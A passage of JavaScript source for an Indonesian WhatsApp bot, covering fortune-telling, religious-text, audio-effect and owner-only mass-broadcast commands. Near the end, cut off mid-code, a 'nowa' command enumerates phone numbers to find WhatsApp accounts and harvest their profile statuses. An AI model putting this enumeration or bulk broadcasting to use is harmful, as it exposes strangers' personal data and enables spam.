let anu = await primbon.arti_nama(text)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'kecocokannama': case 'cocoknama': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} ZALL, 7, 7, 2005`
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
}
break
//=================================================//
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} ZALL|Putri`
let [nama1, nama2] = text.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return m.reply(anu.message)
haikal.sendImage(m.chat,anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}
break
//=================================================//
case 'jadianpernikahan': case 'jadiannikah': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
}
break
//=================================================//
case 'sifatusaha': {
if (isBan) throw sticBanLu(from)
if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
}
break
//=================================================//
case 'rejeki': case 'rezeki': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'pekerjaan': case 'kerja': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
}
break
//=================================================//
case 'potensipenyakit': case 'penyakit': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artitarot': case 'tarot': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendImage(m.chat, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'fengshui': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} ZALL, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
let [nama, gender, tahun] = text.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
}
break
//=================================================//
case 'haribaik': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harisangar': case 'taliwangke': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harinaas': case 'harisial': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
}
break
//=================================================//
case 'nagahari': case 'harinaga': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'arahrejeki': case 'arahrezeki': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'peruntungan': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
let [nama, tgl, bln, thn, untuk] = text.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'weton': case 'wetonjawa': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
}
break
//=================================================//
case 'sifat': case 'karakter': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} ZALL, 7, 7, 2005`
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
}
break
//=================================================//
case 'keberuntungan': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} ZALL, 7, 7, 2005`
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
}
break
//=================================================//
case 'memancing': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'masasubur': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
 if (isBan) throw sticBanLu(from)
xeony_buffer = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await haikal.sendMessage(m.chat, { audio: xeony_buffer, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
break
//=================================================//
case 'bcgc': case 'bcgroup': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let getGroups = await haikal.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
let btn = [{
urlButton: {
displayText: 'Youtube',
url: 'https://youtube.com/c/@ZallMods'
}
}, {
callButton: {
displayText: 'Number Phone Owner',
phoneNumber: '+6285714170944'
}
}, {
quickReplyButton: {
displayText: 'Status Bot',
id: 'ping'
}
}, {
quickReplyButton: {
displayText: 'Contact Owner',
id: 'owner'
}
}, {
quickReplyButton: {
displayText: 'Telegram',
id: 'sc'
}
}]
let txt = `「 Broadcast Bot 」\n\n${text}`
haikal.send5ButImg(i, txt, haikal.user.name, global.thumb, btn)
}
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
//=================================================//
case 'bc': case 'broadcast': case 'bcall': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let anu = await store.chats.all().map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
for (let yoi of anu) {
await sleep(1500)
let btn = [{
urlButton: {
displayText: 'Youtube',
url: 'https://youtube.com/c/@ZallMods'
}
}, {
callButton: {
displayText: 'Number Phone Owner',
phoneNumber: '+6285714170944'
}
}, {
quickReplyButton: {
displayText: 'Status Bot',
id: 'ping'
}
}, {
quickReplyButton: {
displayText: 'Contact Owner',
id: 'owner'
}
}, {
quickReplyButton: {
displayText: 'Telegram',
id: 'sc'
}
}]
let txt = `「 Broadcast Bot 」\n\n${text}`
haikal.send5ButImg(yoi, txt, haikal.user.name, global.thumb, btn)
}
reply('Sukses Broadcast')
}
break
//=================================================//
case 'cerpen':{
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`

Judul cerpen yang tersedia lihat di list *CERPEN MENU*
 
cerpen anak
cerpen bahasa daerah
cerpen bahasa inggrisKak
cerpen bahasa jawa
cerpen bahasa sunda
cerpen budaya
cerpen cinta
cerpen cinta islami
cerpen cinta pertama
cerpen cinta romantis
cerpen cinta sedih
cerpen cinta segitiga
cerpen cinta sejati
cerpen galau
cerpen gokil
cerpen inspiratif
cerpen jepang
cerpen kehidupan
cerpen keluarga
cerpen kisah nyata
cerpen korea
cerpen kristen
cerpen liburan
cerpen lingkungan
cerpen lucu
cerpen malaysia
cerpen mengharukan
cerpen misteri
cerpen motivasi
cerpen nasihat
cerpen nasionalisme
cerpen olahraga
cerpen patah hati
cerpen penantian
cerpen pendidikan
cerpen pengalaman pribadi
cerpen pengorbanan
cerpen penyesalan
cerpen perjuangan
cerpen perpisahan
cerpen persahabatan
cerpen petualangan
cerpen ramadhan
cerpen remaja
cerpen renungan
cerpen rindu
cerpen rohani
cerpen romantis
cerpen sastra
cerpen sedih
cerpen sejarah
cerpen slice of life
cerpen terjemahan
cerpen thriller

`)
let cerpe = await cerpen(q)
var memek = await getBuffer(picak+`Cerpen ${q}`)
await haikal.send5ButImg(from, `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`, `© ${ownername}`,memek, [{"urlButton": {"displayText": "YouTube Creator","url": `${youtube}`}}] )
}
break
//=================================================//
case 'zodiak': case 'zodiac': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix+ command} 7 7 2005`
let zodiak = [
["capricorn", new Date(1970, 0, 1)],
["aquarius", new Date(1970, 0, 20)],
["pisces", new Date(1970, 1, 19)],
["aries", new Date(1970, 2, 21)],
["taurus", new Date(1970, 3, 21)],
["gemini", new Date(1970, 4, 21)],
["cancer", new Date(1970, 5, 22)],
["leo", new Date(1970, 6, 23)],
["virgo", new Date(1970, 7, 23)],
["libra", new Date(1970, 8, 23)],
["scorpio", new Date(1970, 9, 23)],
["sagittarius", new Date(1970, 10, 22)],
["capricorn", new Date(1970, 11, 22)]
].reverse()
function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
let date = new Date(text)
if (date == 'Invalid Date') throw date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
let zodiac = await getZodiac(birth[1], birth[2])
let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'shio': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
let anu = await primbon.shio(text)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Hasil :* ${anu.message}`, m)
}
break
//=================================================//
case 'ringtone': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} black rover`
let { ringtone } = require('./baseikal/lib/scraper')
let anu = await ringtone(text)
let result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
}
break
//=================================================//
case 'iqra': {
if (isBan) throw sticBanLu(from)
oh = `Example : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
if (!text) throw oh
yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
haikal.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:m}).catch ((err) => m.reply(oh))
}
break
//=================================================//
case 'juzamma': {
if (isBan) throw sticBanLu(from)
if (args[0] === 'pdf') {
haikal.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'}, mimetype: 'application/pdf', fileName: 'juz-amma-arab-latin-indonesia.pdf'}, {quoted:m})
} else if (args[0] === 'docx') {
haikal.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'}, mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileName: 'juz-amma-arab-latin-indonesia.docx'}, {quoted:m})
} else if (args[0] === 'pptx') {
haikal.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'}, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'juz-amma-arab-latin-indonesia.pptx'}, {quoted:m})
} else if (args[0] === 'xlsx') {
haikal.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'}, mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fileName: 'juz-amma-arab-latin-indonesia.xlsx'}, {quoted:m})
} else {
reply(`Mau format apa ? Example : ${prefix + command} pdf
Format yang tersedia : pdf, docx, pptx, xlsx`)
}
}
break
//=================================================//
case 'hadis': case 'hadist': {
if (isBan) throw sticBanLu(from)
if (!args[0]) throw `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1
Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`
if (!args[1]) throw `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
try {
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
let { number, arab, id } = res.find(v => v.number == args[1])
reply(`No. ${number}
${arab}
${id}`)
} catch (e) {
reply(`Hadis tidak ditemukan !`)
}
}
break
//=================================================//
case 'tafsirsurah': {
if (isBan) throw sticBanLu(from)
if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
let txt = `「 *Tafsir Surah*」
*Pendek* : ${res.result.data.tafsir.id.short}
*Panjang* : ${res.result.data.tafsir.id.long}
( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
reply(txt)
}
break
//=================================================//
 case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
try {
if (isBan) throw sticBanLu(from)
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply(err)
let buff = fs.readFileSync(ran)
haikal.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: m })
fs.unlinkSync(ran)
})
} else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
} catch (e) {
reply(e)
}
break
//=================================================//
case 'setcmd': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
if (!text) throw `Untuk Command Apa?`
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
global.db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
reply(`Done!`)
}
break
//=================================================//
case 'delcmd': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) throw `Tidak ada hash`
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'
delete global.db.data.sticker[hash]
reply(`Done!`)
}
break
//=================================================//
case 'listcmd': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
haikal.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break
//=================================================//
case 'lockcmd': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
let hash = m.quoted.fileSha256.toString('base64')
if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
global.db.data.sticker[hash].locked = !/^un/i.test(command)
reply('Done!')
}
break
//=================================================//
case 'public': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
haikal.public = true
reply('Sukse Change To Public')
}
break
//=================================================//
case 'self': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
haikal.public = false
reply('Sukses Change To Self')
}
break
//=================================================//
case 'nowa': {
if (isBan) return sticBanLu(from)
if (!args[0]) return reply(`Kirim perintah ${prefix+command} <nomer>`)
var noteks = args[0]
if (!noteks.includes('x')) return reply('lah?')
reply(mess.wait)
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
var random_length = countInstances(noteks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}
var nomerny = `LIST NOMER WHATSAPP\n\nPunya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nTidak Terdaftar\n`
for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]
var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}
var anu = await haikal.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false
try {
try {
var anu1 = await haikal.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
